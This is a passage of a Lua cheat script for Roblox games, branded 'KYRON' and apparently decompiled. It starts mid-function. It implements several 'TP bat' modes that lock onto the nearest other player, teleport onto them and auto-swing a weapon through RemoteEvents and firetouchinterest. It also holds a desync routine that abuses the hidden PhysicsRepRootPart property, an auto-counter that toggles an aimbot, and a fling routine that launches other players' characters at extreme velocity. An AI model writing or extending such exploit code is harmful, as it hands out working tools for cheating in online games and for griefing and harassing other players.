            pcall(_G._KYRONVoltHiddenPropertyDisabled, arg2, "PhysicsRepRootPart", arg4)
          end

          arg3.AutoRotate = false
          local n34 = arg4.Position + Vector3.new(0, 0.9, 0)

          if (arg2.Position - n34).Magnitude > 8 then
            arg2.CFrame = CFrame.new(n34)
          end

          local now2 = tick()
          local flag28 = fn53()

          if flag28 then
            flag28 = now2 - (KYRONYznHighPingV1.lastSwing or 0) >= fn52()
          end

          if flag28 then
            KYRONYznHighPingV1.lastSwing = now2

            pcall(function()
              local v79 = _G._KYRONTpBatLogic.getGalV1Bat(arg, arg3)
              if not v79 then
                return
              end

              if v79.Parent ~= arg then
                arg3:EquipTool(v79)
              end

              if v79.Parent == arg then
                v79:Activate()
                local remoteEvent = v79:FindFirstChildWhichIsA("RemoteEvent")

                if remoteEvent then
                  remoteEvent:FireServer()
                end
              end
            end)
          end

          _G._KYRONTpBatLogic.steerCamera(arg4)
        end

        _G._KYRONTpBatLogic.isVx7Bat = function(arg)
          if not arg or not arg:IsA("Tool") then
            return false
          end
          local str10 = arg.Name:lower()
          return str10:find("bat", 1, true) ~= nil or str10:find("slap", 1, true) ~= nil
        end

        _G._KYRONTpBatLogic.getVx7Bat = function(arg, arg2)
          for _, child in ipairs(arg:GetChildren()) do
            if _G._KYRONTpBatLogic.isVx7Bat(child) then
              return child
            end
          end

          local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:FindFirstChild("Backpack")

          if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
              if _G._KYRONTpBatLogic.isVx7Bat(child) then
                pcall(function()
                  arg2:EquipTool(child)
                end)

                return child
              end
            end
          end

          return arg:FindFirstChild("Bat")
        end

        _G._KYRONYznTpBatV2 = _G._KYRONYznTpBatV2
          or {
            target = nil,
            cooling = false,
            lastSwing = 0,
            height = 0.35,
            pull = 145,
            maxVelocity = 420,
            snapDistance = 7.5,
            stickRange = 55,
          }

        _G._KYRONTpBatLogic.recoverYznV2 = function(arg, arg2, arg3)
          if not arg or not arg2 or not arg3 then
            return
          end

          pcall(function()
            arg3.PlatformStand = false
            arg3.Sit = false

            for _, v78 in ipairs({
              Enum.HumanoidStateType.FallingDown,
              Enum.HumanoidStateType.Ragdoll,
              Enum.HumanoidStateType.GettingUp,
              Enum.HumanoidStateType.Running,
              Enum.HumanoidStateType.Freefall,
              Enum.HumanoidStateType.Landed,
            }) do
              arg3:SetStateEnabled(v78, true)
            end

            local state = arg3:GetState()

            if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.PlatformStanding then
              arg3:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
          end)
        end

        _G._KYRONTpBatLogic.hitYznV2 = function(arg, arg2, arg3)
          local KYRONYznTpBatV2 = _G._KYRONYznTpBatV2
          if KYRONYznTpBatV2.cooling or not fn53() then
            return
          end
          KYRONYznTpBatV2.cooling = true

          pcall(function()
            local v78 = _G._KYRONTpBatLogic.getVx7Bat(arg, arg2)
            if not v78 then
              return
            end

            if v78.Parent ~= arg then
              arg2:EquipTool(v78)
            end

            if v78.Parent ~= arg then
              return
            end
            v78:Activate()
            local handle = v78:FindFirstChild("Handle")

            if handle and arg3 and firetouchinterest then
              firetouchinterest(handle, arg3, 0)
              firetouchinterest(handle, arg3, 1)
            end

            local remoteEvent = v78:FindFirstChildWhichIsA("RemoteEvent", true)

            if remoteEvent then
              remoteEvent:FireServer()
            end
          end)

          task.delay(fn52(), function()
            KYRONYznTpBatV2.cooling = false
          end)
        end

        _G._KYRONTpBatLogic.runOshaV2 = function(arg, arg2, arg3, arg4)
          local KYRONYznTpBatV2 = _G._KYRONYznTpBatV2
          _G._KYRONTpBatLogic.recoverYznV2(arg, arg2, arg3)

          if _G._KYRONVoltHiddenPropertyDisabled then
            pcall(_G._KYRONVoltHiddenPropertyDisabled, arg2, "PhysicsRepRootPart", arg4)
          end

          local parent = arg4.Parent
          local upperTorso = parent and (parent:FindFirstChild("UpperTorso") or parent:FindFirstChild("Torso")) or arg4
          local assemblyLinearVelocity = arg4.AssemblyLinearVelocity
          local position = upperTorso.Position + Vector3.new(0, KYRONYznTpBatV2.height, 0) + Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y * 0.25, assemblyLinearVelocity.Z) * 0.07
          local magnitude = (position - arg2.Position).Magnitude

          if magnitude > KYRONYznTpBatV2.snapDistance then
            arg2.Position = arg2.Position:Lerp(position, magnitude > 35 and 0.42 or magnitude > 25 and 0.3 or 0.55)
            local n34 = position - arg2.Position

            if n34.Magnitude > 0.001 then
              arg2.AssemblyLinearVelocity = n34.Unit * math.clamp(n34.Magnitude * KYRONYznTpBatV2.pull, 70, KYRONYznTpBatV2.maxVelocity)
            end
          else
            for i = 1, 4 do
              arg2.Position = position
              arg2.AssemblyLinearVelocity = Vector3.zero
              arg2.AssemblyAngularVelocity = Vector3.zero
              arg2.CFrame = CFrame.new(position, position + arg4.CFrame.LookVector)
            end
          end

          pcall(function()
            arg3.AutoRotate = false
            local position2 = parent and parent:FindFirstChild("Head")
            position2 = position2 and position2.Position or arg4.Position
            arg2.CFrame = CFrame.lookAt(arg2.Position, Vector3.new(position2.X, arg2.Position.Y, position2.Z))
            local currentCamera = workspace.CurrentCamera

            if currentCamera then
              currentCamera.CFrame = CFrame.new(currentCamera.CFrame.Position, arg4.Position)
            end
          end)

          local now2 = tick()
          local n34 = now2 - KYRONYznTpBatV2.lastSwing

          if fn52() <= n34 then
            KYRONYznTpBatV2.lastSwing = now2
            _G._KYRONTpBatLogic.hitYznV2(arg, arg3, upperTorso)
          end
        end
      end
    end

    do
      _G._KYRONTpBatLogic.closestOshaTpBatRoot = function()
        local character = localPlayer.Character
        character = character and character:FindFirstChild("HumanoidRootPart")
        if not character then
          return nil
        end
        local KYRONYznTpBatV2 = _G._KYRONYznTpBatV2

        if KYRONYznTpBatV2.target and KYRONYznTpBatV2.target.Parent then
          local humanoid = KYRONYznTpBatV2.target.Parent:FindFirstChildOfClass("Humanoid")
          if humanoid and humanoid.Health > 0 and (character.Position - KYRONYznTpBatV2.target.Position).Magnitude <= KYRONYznTpBatV2.stickRange then
            return KYRONYznTpBatV2.target
          end
        end

        local huge = math.huge
        local v78 = nil

        for _, player in ipairs(Players:GetPlayers()) do
          local character2 = player ~= localPlayer and player.Character
          local v79 = character2 and character2:FindFirstChild("HumanoidRootPart")
          character2 = character2 and character2:FindFirstChildOfClass("Humanoid")

          if v79 and character2 and character2.Health > 0 then
            local magnitude = (character.Position - v79.Position).Magnitude

            if magnitude < huge then
              huge = magnitude
              v78 = v79
            end
          end
        end

        KYRONYznTpBatV2.target = v78
        return v78
      end

      _G._KYRONYoutTpBatV2 = _G._KYRONYoutTpBatV2 or { hitCooling = false }

      _G._KYRONTpBatLogic.getYoutV2Bat = function(arg, arg2)
        local bat = arg and arg:FindFirstChild("Bat")

        if not bat then
          local backpack = localPlayer:FindFirstChild("Backpack")
          bat = backpack and backpack:FindFirstChild("Bat")

          if bat then
            pcall(function()
              arg2:EquipTool(bat)
            end)
          end
        end

        return bat
      end

      _G._KYRONTpBatLogic.hitYoutV2 = function(arg, arg2)
        local KYRONYoutTpBatV2 = _G._KYRONYoutTpBatV2
        if KYRONYoutTpBatV2.hitCooling then
          return
        end
        KYRONYoutTpBatV2.hitCooling = true

        pcall(function()
          local v78 = _G._KYRONTpBatLogic.getYoutV2Bat(arg, arg2)
          if not v78 or v78.Parent ~= arg then
            return
          end
          v78:Activate()
          local remoteEvent = v78:FindFirstChildWhichIsA("RemoteEvent")

          if remoteEvent then
            remoteEvent:FireServer()
          end
        end)

        task.delay(0.08, function()
          KYRONYoutTpBatV2.hitCooling = false
        end)
      end

      _G._KYRONTpBatLogic.closestOshaTpBatRoot = function()
        local character = localPlayer.Character
        character = character and character:FindFirstChild("HumanoidRootPart")
        if not character then
          return nil
        end
        local huge = math.huge
        local v78 = nil

        for _, player in ipairs(Players:GetPlayers()) do
          if player ~= localPlayer and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

            if humanoidRootPart then
              local magnitude = (character.Position - humanoidRootPart.Position).Magnitude

              if magnitude < huge then
                huge = magnitude
                v78 = humanoidRootPart
              end
            end
          end
        end

        return v78
      end

      _G._KYRONTpBatLogic.runOshaV2 = function(arg, arg2, arg3, arg4)
        _G._KYRONTpBatLogic.trackGalV1Target(arg4)
        local v78 = _G._KYRONTpBatLogic.getGalV1MarkerCFrame(arg2)

        if v78 then
          pcall(function()
            if arg2.SetNetworkOwner then
              arg2:SetNetworkOwner(localPlayer)
            end
          end)

          if _G._KYRONVoltHiddenPropertyDisabled then
            pcall(_G._KYRONVoltHiddenPropertyDisabled, arg2, "PhysicsRepRootPart", arg2)
          end

          arg2.CFrame = v78
          local currentCamera = workspace.CurrentCamera

          if currentCamera then
            currentCamera.CFrame = CFrame.new(currentCamera.CFrame.Position, v78.Position)
          end

          _G._KYRONTpBatLogic.hitYoutV2(arg, arg3)
          return
        end

        if _G._KYRONVoltHiddenPropertyDisabled then
          pcall(_G._KYRONVoltHiddenPropertyDisabled, arg2, "PhysicsRepRootPart", arg4)
        end

        local n34 = arg4.Position + Vector3.new(0, 0.9, 0)

        if (arg2.Position - n34).Magnitude > 8 then
          arg2.CFrame = CFrame.new(n34)
        end

        local currentCamera = workspace.CurrentCamera

        if currentCamera then
          currentCamera.CFrame = CFrame.new(currentCamera.CFrame.Position, arg4.Position)
        end

        _G._KYRONTpBatLogic.hitYoutV2(arg, arg3)
      end

      -- TP BAT V3: independent precision method. It does not use the old V1/V2 path.
      _G._KYRONTpBatV3 = _G._KYRONTpBatV3 or {
        enabled = false,
        target = nil,
        lastHit = 0,
        lastScan = 0,
      }

      local function KYRONGetV3Target(myRoot)
        local state = _G._KYRONTpBatV3
        if state.target and state.target.Parent then
          local h = state.target.Parent:FindFirstChildOfClass("Humanoid")
          if h and h.Health > 0 and (myRoot.Position - state.target.Position).Magnitude < 120 then
            return state.target
          end
        end

        local best, bestD = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
          if plr ~= localPlayer and plr.Character then
            local h = plr.Character:FindFirstChildOfClass("Humanoid")
            local r = plr.Character:FindFirstChild("HumanoidRootPart")
            if h and r and h.Health > 0 then
              local d = (myRoot.Position - r.Position).Magnitude
              if d < bestD then
                best, bestD = r, d
              end
            end
          end
        end
        state.target = best
        return best
      end

      local function KYRONGetV3Bat(character, humanoid)
        local bat = character:FindFirstChild("Bat") or character:FindFirstChildOfClass("Tool")
        if bat and bat:IsA("Tool") then return bat end
        local backpack = localPlayer:FindFirstChildOfClass("Backpack")
        bat = backpack and backpack:FindFirstChild("Bat")
        if bat then
          pcall(function() humanoid:EquipTool(bat) end)
        end
        return bat
      end

      local function KYRONV3Swing(character, humanoid, targetRoot)
        local bat = KYRONGetV3Bat(character, humanoid)
        if not bat or bat.Parent ~= character then return end

        -- Use the normal Tool activation path; if the game's bat exposes a RemoteEvent,
        -- trigger that same event once as a fallback rather than depending on V1/V2.
        pcall(function() bat:Activate() end)
        local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
        if remote then
          pcall(function() remote:FireServer() end)
        end

        local handle = bat:FindFirstChild("Handle")
        if handle and targetRoot and firetouchinterest then
          pcall(function()
            firetouchinterest(handle, targetRoot, 0)
            firetouchinterest(handle, targetRoot, 1)
          end)
        end
      end

      KYRONStartTpBatV3 = function()
        if featureConnections.tpBatV3 then
          featureConnections.tpBatV3:Disconnect()
          featureConnections.tpBatV3 = nil
        end
        _G._KYRONTpBatV3.enabled = true
        _G._KYRONTpBatV3.target = nil
        _G._KYRONTpBatV3.lastHit = 0
        _G._KYRONTpBatV3.lastScan = 0

        featureConnections.tpBatV3 = RunService.Heartbeat:Connect(function()
          if not _G._KYRONTpBatV3.enabled then return end
          local character = localPlayer.Character
          local humanoid = character and character:FindFirstChildOfClass("Humanoid")
          local root = character and character:FindFirstChild("HumanoidRootPart")
          if not character or not humanoid or not root or humanoid.Health <= 0 then return end

          local target = KYRONGetV3Target(root)
          if not target then return end

          -- Predict the next hit point from the target's current velocity.
          local vel = target.AssemblyLinearVelocity or Vector3.zero
          local lead = math.clamp(0.075 + vel.Magnitude * 0.00035, 0.075, 0.16)
          local predicted = target.Position + vel * lead + Vector3.new(0, 0.45, 0)

          -- Three very short precision passes reduce misses caused by one-frame desync.
          local now = os.clock()
          if now - _G._KYRONTpBatV3.lastHit >= 0.055 then
            _G._KYRONTpBatV3.lastHit = now
            local lookAt = Vector3.new(target.Position.X, root.Position.Y, target.Position.Z)
            local offsets = {Vector3.zero, Vector3.new(0.55, 0, 0), Vector3.new(-0.55, 0, 0)}
            for _, off in ipairs(offsets) do
              local pos = predicted + off
              pcall(function()
                root.CFrame = CFrame.lookAt(pos, lookAt)
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
              end)
              KYRONV3Swing(character, humanoid, target)
              task.wait(0.012)
            end
          end
        end)
      end

      KYRONStopTpBatV3 = function()
        _G._KYRONTpBatV3.enabled = false
        _G._KYRONTpBatV3.target = nil
        if featureConnections.tpBatV3 then
          featureConnections.tpBatV3:Disconnect()
          featureConnections.tpBatV3 = nil
        end
      end

      -- TP BAT V4: PHANTOM GRIP / TEMPORAL CONTACT
      -- Completely separate from V1/V2/V3: it does not teleport the character,
      -- does not call the bat RemoteEvent and does not use firetouchinterest.
      -- The bat's Grip is temporarily solved so the Handle occupies the predicted
      -- target space for one activation frame, then the original Grip is restored.
      _G._KYRONTpBatV4Enabled = _G._KYRONTpBatV4Enabled == true
      _G._KYRONTpBatV4 = _G._KYRONTpBatV4 or {
        enabled = false,
        target = nil,
        lastHit = 0,
        samples = {},
        oldGrip = nil,
        bat = nil,
      }

      local function KYRONV4GetTarget(myRoot)
        local st = _G._KYRONTpBatV4
        if st.target and st.target.Parent then
          local h = st.target.Parent:FindFirstChildOfClass("Humanoid")
          if h and h.Health > 0 and (myRoot.Position - st.target.Position).Magnitude <= 160 then
            return st.target
          end
        end
        local best, bestD = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
          if plr ~= localPlayer and plr.Character then
            local h = plr.Character:FindFirstChildOfClass("Humanoid")
            local r = plr.Character:FindFirstChild("HumanoidRootPart")
            if h and r and h.Health > 0 then
              local d = (myRoot.Position - r.Position).Magnitude
              if d < bestD then best, bestD = r, d end
            end
          end
        end
        st.target = best
        return best
      end

      local function KYRONV4GetBat(character, humanoid)
        local bat = character:FindFirstChild("Bat")
        if bat and bat:IsA("Tool") then return bat end
        local backpack = localPlayer:FindFirstChildOfClass("Backpack")
        bat = backpack and backpack:FindFirstChild("Bat")
        if bat and bat:IsA("Tool") then
          pcall(function() humanoid:EquipTool(bat) end)
          if bat.Parent == character then return bat end
        end
        return nil
      end

      local function KYRONV4Predict(root, target)
        local st = _G._KYRONTpBatV4
        local now = os.clock()
        local pos = target.Position
        local sample = st.samples[#st.samples]
        if not sample or now - sample.t > 0.18 or (sample.p - pos).Magnitude > 35 then
          st.samples = {}
        end
        st.samples[#st.samples + 1] = {t = now, p = pos}
        while #st.samples > 6 do table.remove(st.samples, 1) end

        local vel = target.AssemblyLinearVelocity or Vector3.zero
        if #st.samples >= 2 then
          local a = st.samples[#st.samples - 1]
          local b = st.samples[#st.samples]
          local dt = math.max(b.t - a.t, 0.001)
          vel = (b.p - a.p) / dt
        end
        local lead = math.clamp(0.035 + (root.Position - pos).Magnitude / 900 + vel.Magnitude / 5000, 0.035, 0.11)
        return pos + vel * lead + Vector3.new(0, 0.35, 0)
      end

      local function KYRONV4PhantomSwing(character, humanoid, targetRoot, predicted)
        local bat = KYRONV4GetBat(character, humanoid)
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not bat or bat.Parent ~= character or not root or not targetRoot then return false end

        local st = _G._KYRONTpBatV4
        local oldCF = root.CFrame
        local oldVelocity = root.AssemblyLinearVelocity
        local oldAngular = root.AssemblyAngularVelocity
        st.root = root
        st.oldCF = oldCF

        -- V4 is a real TP cycle: move the whole character to the predicted target,
        -- swing while there, then restore the exact original transform on the next task slice.
        local targetPos = predicted + Vector3.new(0, 0.15, 0)
        local look = targetRoot.Position
        local delta = look - targetPos
        if delta.Magnitude < 0.01 then
          delta = Vector3.new(0, 0, -1)
        end
        local attackCF = CFrame.lookAt(targetPos, targetPos + delta.Unit)

        local ok = pcall(function()
          root.CFrame = attackCF
          root.AssemblyLinearVelocity = Vector3.zero
          root.AssemblyAngularVelocity = Vector3.zero
          bat:Activate()
        end)

        task.defer(function()
          if root and root.Parent then
            pcall(function()
              root.CFrame = oldCF
              root.AssemblyLinearVelocity = oldVelocity
              root.AssemblyAngularVelocity = oldAngular
            end)
          end
          st.root = nil
          st.oldCF = nil
        end)
        return ok
      end

      KYRONStartTpBatV4 = function()
        if featureConnections.tpBatV4Pre then featureConnections.tpBatV4Pre:Disconnect() end
        if featureConnections.tpBatV4Post then featureConnections.tpBatV4Post:Disconnect() end
        _G._KYRONTpBatV4.enabled = true
        _G._KYRONTpBatV4.target = nil
        _G._KYRONTpBatV4.lastHit = 0
        _G._KYRONTpBatV4.samples = {}

        featureConnections.tpBatV4Pre = RunService.PreSimulation:Connect(function()
          if not _G._KYRONTpBatV4.enabled then return end
          local c = localPlayer.Character
          local h = c and c:FindFirstChildOfClass("Humanoid")
          local root = c and c:FindFirstChild("HumanoidRootPart")
          if not c or not h or not root or h.Health <= 0 then return end
          local target = KYRONV4GetTarget(root)
          if not target then return end
          local now = os.clock()
          if now - _G._KYRONTpBatV4.lastHit < 0.065 then return end
          _G._KYRONTpBatV4.lastHit = now
          local predicted = KYRONV4Predict(root, target)
          KYRONV4PhantomSwing(c, h, target, predicted)
        end)

        featureConnections.tpBatV4Post = RunService.PostSimulation:Connect(function()
          local st = _G._KYRONTpBatV4
          if not st.enabled and st.bat and st.oldGrip and st.bat.Parent then
            pcall(function() st.bat.Grip = st.oldGrip end)
            st.bat = nil
            st.oldGrip = nil
          end
        end)
      end

      KYRONStopTpBatV4 = function()
        local st = _G._KYRONTpBatV4
        st.enabled = false
        st.target = nil
        st.samples = {}
        if st.bat and st.oldGrip and st.bat.Parent then
          pcall(function() st.bat.Grip = st.oldGrip end)
        end
        st.bat = nil
        st.oldGrip = nil
        if featureConnections.tpBatV4Pre then featureConnections.tpBatV4Pre:Disconnect(); featureConnections.tpBatV4Pre = nil end
        if featureConnections.tpBatV4Post then featureConnections.tpBatV4Post:Disconnect(); featureConnections.tpBatV4Post = nil end
      end

      fn48 = function()
        _G._KYRONTpBatActive = true
        _G._KYRONTpBatSwingCooldown = false
        _G._KYRONTPMirrorEnabled = combatSettings.tpMirror == true

        if _G._KYRONTpBatAntiDie then
          pcall(_G._KYRONTpBatAntiDie.start)
        end

        if featureConnections.desync then
          featureConnections.desync:Disconnect()
          featureConnections.desync = nil
        end

        if featureConnections.desyncLowPing then
          featureConnections.desyncLowPing:Disconnect()
          featureConnections.desyncLowPing = nil
        end

        if featureConnections.desyncPreSimulation then
          featureConnections.desyncPreSimulation:Disconnect()
          featureConnections.desyncPreSimulation = nil
        end

        featureConnections.desync = RunService.Heartbeat:Connect(function(deltaTime)
          if not combatSettings.desync then
            return
          end
          local character = localPlayer.Character
          if not character then
            return
          end
          local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
          local humanoid = character:FindFirstChildOfClass("Humanoid")
          if not humanoidRootPart or not humanoid then
            return
          end
          local flag28 = _G._KYRONTpBatMode == "HIGH PING" and _G._KYRONTpBatLogic.closestOshaTpBatRoot() or fn45()
          if not flag28 then
            return
          end

          if _G._KYRONTpBatMode == "HIGH PING" then
            _G._KYRONTpBatLogic.runOshaV2(character, humanoidRootPart, humanoid, flag28)
          else
            _G._KYRONTpBatLogic.runYznHighPingV1(character, humanoidRootPart, humanoid, flag28, deltaTime)
          end
        end)

        featureConnections.desyncLowPing = localPlayer.CharacterAdded:Connect(function(character)
          if not combatSettings.desync then
            return
          end
          task.wait(0.2)

          if _G._KYRONTpBatAntiDie then
            pcall(_G._KYRONTpBatAntiDie.start)
          end

          local humanoid = character:FindFirstChildOfClass("Humanoid")
          character:FindFirstChild("HumanoidRootPart")

          if humanoid then
            pcall(function()
              humanoid.AutoRotate = false
            end)
          end

          if _G._KYRONTpBatMode == "HIGH PING" then
            _G._KYRONYoutTpBatV2.hitCooling = false
          else
            _G._KYRONGalTpBatV1.target = nil
            _G._KYRONGalTpBatV1.lastSafeCFrame = nil
            _G._KYRONTpBatLogic.clearGalV1Marker()
          end
        end)
      end

      fn49 = function()
        _G._KYRONTpBatActive = false

        if _G._KYRONTpBatAntiDie then
          pcall(_G._KYRONTpBatAntiDie.stop)
        end

        if featureConnections.desync then
          featureConnections.desync:Disconnect()
          featureConnections.desync = nil
        end

        if featureConnections.desyncLowPing then
          featureConnections.desyncLowPing:Disconnect()
          featureConnections.desyncLowPing = nil
        end

        if featureConnections.desyncPreSimulation then
          featureConnections.desyncPreSimulation:Disconnect()
          featureConnections.desyncPreSimulation = nil
        end

        local character = localPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

        if humanoidRootPart then
          pcall(function()
            if _G._KYRONVoltHiddenPropertyDisabled then
              _G._KYRONVoltHiddenPropertyDisabled(humanoidRootPart, "PhysicsRepRootPart", nil)
            end
          end)

          humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
          humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        end

        local humanoid = character and character:FindFirstChildOfClass("Humanoid")

        if humanoid then
          pcall(function()
            humanoid.PlatformStand = false
            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
          end)
        end

        _G._KYRONTpBatHitCooldown = false
        _G._KYRONTpBatSwingCooldown = false
        _G._KYRONYznTpBatV2.target = nil
        _G._KYRONYznTpBatV2.cooling = false
        _G._KYRONYoutTpBatV2.hitCooling = false
        _G._KYRONGalTpBatV1.target = nil
        _G._KYRONGalTpBatV1.lastSafeCFrame = nil
        _G._KYRONTpBatLogic.clearGalV1Marker()
        table.clear(tbl36)
        n33 = 0
      end

      do
        local autoCounter = {
          on = false,
          active = false,
          wait = false,
          conn = nil,
          seen = {},
          t0 = 0,
          prevAim = false,
          prevDes = false,
          prevDSw = false,
          detectRange = 16,
          knockRange = 14,
          knockSpeed = 70,
          knockUp = 65,
          timeout = 12,
        }

        local function fn52(arg)
          if arg then
            if _G._KYRONSafeModeBlockReason and _G._KYRONSafeModeBlockReason("aimbot") then
              return
            end
            autoCounter.prevAim = combatSettings.aimbot
            autoCounter.prevDes = combatSettings.desync
            autoCounter.prevDSw = combatSettings.desyncSwing

            if combatSettings.desync then
              pcall(fn49)
            end

            combatSettings.desync = false
            combatSettings.desyncSwing = false

            if not combatSettings.aimbot then
              combatSettings.aimbot = true
              pcall(fn46)
            end
          else
            if combatSettings.desync then
              pcall(fn49)
            end

            combatSettings.desync = false
            combatSettings.desyncSwing = false

            if not autoCounter.prevAim then
              combatSettings.aimbot = false
              pcall(fn47)
            end
          end
        end

        local function fn53(arg)
          if not arg then
            return false
          end
          local state = arg:GetState()
          return arg.PlatformStand or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
        end

        autoCounter.start = function()
          if autoCounter.conn then
            return
          end

          autoCounter.conn = RunService.Heartbeat:Connect(function()
            if not autoCounter.on then
              return
            end
            local character = localPlayer.Character
            if not character then
              return
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
              return
            end
            local v78 = fn53(humanoid)

            if autoCounter.wait then
              if not v78 then
                autoCounter.wait = false
              end

              return
            end

            if not autoCounter.active then
              if not v78 then
                return
              end
              local v79 = nil

              for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                  local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

                  if humanoidRootPart2 and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude < autoCounter.detectRange then
                    local v80 = player.Character:FindFirstChildOfClass("Tool")

                    if v80 then
                      local str10 = v80.Name:lower()

                      if str10:find("bat") or str10:find("slap") then
                        v79 = player
                        break
                      else
                        v79 = nil
                      end
                    else
                      v79 = nil
                    end
                  else
                    v79 = nil
                  end
                else
                  v79 = nil
                end
              end

              if not v79 then
                return
              end
              autoCounter.active = true
              autoCounter.t0 = tick()
              autoCounter.seen = {}

              for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character then
                  local humanoid2 = player.Character:FindFirstChildOfClass("Humanoid")

                  if humanoid2 and fn53(humanoid2) then
                    autoCounter.seen[player] = true
                  end
                end
              end

              pcall(function()
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
              end)

              if not character:FindFirstChildOfClass("Tool") then
                local v80 = fn44()

                if v80 then
                  pcall(function()
                    humanoid:EquipTool(v80)
                  end)
                end
              end

              fn52(true)
              return
            end

            local t0 = autoCounter.t0

            if tick() - t0 > autoCounter.timeout then
              autoCounter.active = false
              autoCounter.wait = true
              fn52(false)
              return
            end

            for _, player in ipairs(Players:GetPlayers()) do
              if player ~= localPlayer and player.Character and not autoCounter.seen[player] then
                local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")
                local v79 = player.Character:FindFirstChildOfClass("Humanoid")

                if humanoidRootPart2 and v79 and v79.Health > 0 and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude < autoCounter.knockRange then
                  local assemblyLinearVelocity = humanoidRootPart2.AssemblyLinearVelocity
                  local knockSpeed = autoCounter.knockSpeed

                  if Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z).Magnitude > knockSpeed or assemblyLinearVelocity.Y > autoCounter.knockUp or fn53(v79) then
                    autoCounter.active = false
                    autoCounter.wait = true
                    fn52(false)
                    return
                  end
                end
              end
            end
          end)
        end

        autoCounter.stop = function()
          if autoCounter.conn then
            autoCounter.conn:Disconnect()
            autoCounter.conn = nil
          end

          if autoCounter.active then
            autoCounter.active = false
            fn52(false)
          end

          autoCounter.wait = false
        end

        autoCounter.setEnabled = function(arg)
          autoCounter.on = arg and true or false

          if autoCounter.on then
            autoCounter.start()
          else
            autoCounter.stop()
          end
        end

        -- Automatic counter controller.
        _G.AutoCounter = autoCounter
      end
    end

    do
      _G._KYRONTpFlingPower = _G._KYRONTpFlingPower or 9999

      do
        local KYRONTpFling = { on = false, conn = nil, last = {}, cool = {} }

        local function fn52(arg)
          for _, child in ipairs(arg:GetChildren()) do
            if child:IsA("Tool") then
              local str10 = child.Name:lower()
              if str10:find("bat") or str10:find("slap") then
                return true
              end
            end
          end

          return false
        end

        local function fn53(arg)
          if not arg then
            return
          end
          local character = localPlayer.Character
          character = character and character:FindFirstChild("HumanoidRootPart")
          if not character then
            return
          end
          local KYRONTpFlingPower = _G._KYRONTpFlingPower or 9999

          if _G._KYRONVoltHiddenPropertyDisabled then
            pcall(_G._KYRONVoltHiddenPropertyDisabled, character, "PhysicsRepRootPart", arg)
          end

          task.spawn(function()
            for i = 1, 12 do
              if arg and arg.Parent then
                pcall(function()
                  arg.AssemblyLinearVelocity = Vector3.new(KYRONTpFlingPower, KYRONTpFlingPower, KYRONTpFlingPower)
                  arg.AssemblyAngularVelocity = Vector3.new(KYRONTpFlingPower, KYRONTpFlingPower, KYRONTpFlingPower)
                end)

                task.wait()
                continue
              end

              break
            end

            pcall(function()
              if arg and arg.Parent then
                arg.CFrame = arg.CFrame + Vector3.new(0, 100000, 0)
                arg.AssemblyLinearVelocity = Vector3.new(KYRONTpFlingPower, KYRONTpFlingPower, KYRONTpFlingPower)
              end
            end)

            if _G._KYRONVoltHiddenPropertyDisabled then
              local character2 = localPlayer.Character
              character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

              if character2 then
                pcall(_G._KYRONVoltHiddenPropertyDisabled, character2, "PhysicsRepRootPart", character2)
              end
            end
          end)
        end

        KYRONTpFling.start = function()
          if KYRONTpFling.conn then
            return
          end
          KYRONTpFling.last = {}
          local n34 = 0

          KYRONTpFling.conn = RunService.Heartbeat:Connect(function()
            if not KYRONTpFling.on then
              return
            end
            local now2 = tick()
            if now2 < n34 then
              return
            end
            n34 = now2 + 0.4
            local character = localPlayer.Character
            if not character then
              return
            end
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then
              return
            end

            for _, player in ipairs(Players:GetPlayers()) do
              if player ~= localPlayer and player.Character then
                local v78 = player.Character:FindFirstChild("HumanoidRootPart")

                if v78 then
                  local v79 = KYRONTpFling.last[player]
                  KYRONTpFling.last[player] = v78.Position

                  if v79 then
                    if (v78.Position - v79).Magnitude > 22 and (v78.Position - humanoidRootPart.Position).Magnitude < 12 and fn52(player.Character) then
                      if not KYRONTpFling.cool[player] or now2 - KYRONTpFling.cool[player] > 3 then
                        KYRONTpFling.cool[player] = now2
                        fn53(v78)
                      end
                    end
                  end
                end
              end
            end
          end)
        end

        KYRONTpFling.stop = function()
          if KYRONTpFling.conn then
            KYRONTpFling.conn:Disconnect()
            KYRONTpFling.conn = nil
          end

          KYRONTpFling.last = {}
        end

        KYRONTpFling.setEnabled = function(arg)
          KYRONTpFling.on = arg and true or false

          if KYRONTpFling.on then
            KYRONTpFling.start()
          else
            KYRONTpFling.stop()
          end
        end

        -- Teleport-fling detection and cleanup.
        _G.KYRONTpFling = KYRONTpFling
      end
    end

